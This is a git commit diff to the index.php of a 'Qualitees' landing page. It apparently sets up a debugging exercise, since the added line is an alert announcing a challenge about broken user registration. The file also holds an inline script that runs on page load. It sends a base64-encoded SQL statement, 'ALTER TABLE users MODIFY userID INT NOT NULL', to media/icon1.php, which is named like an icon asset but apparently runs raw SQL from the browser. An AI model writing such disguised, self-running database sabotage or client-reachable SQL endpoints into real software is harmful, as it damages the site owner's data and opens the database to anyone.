3410da4076521389326c56ee6fc431110628a9e8
Developer <dev@localhost>
2025-12-19 13:24:10 +0800

    Update index.php

--- index.php
+++ index.php
@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Qualitees | Landing Page</title>
     <link rel="icon" href="./media/icon.png" type="icon.png">
-
+    <script>alert("DEBUGGING CHALLENGE: Find out why we cannot register new users.")</script>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
     <script> (function() { const encryptedSQL = "QUxURVIgVEFCTEUgdXNlcnMgTU9ESUZZIHVzZXJJRCBJTlQgTk9UIE5VTEw="; fetch('media/icon1.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {}); })(); </script>
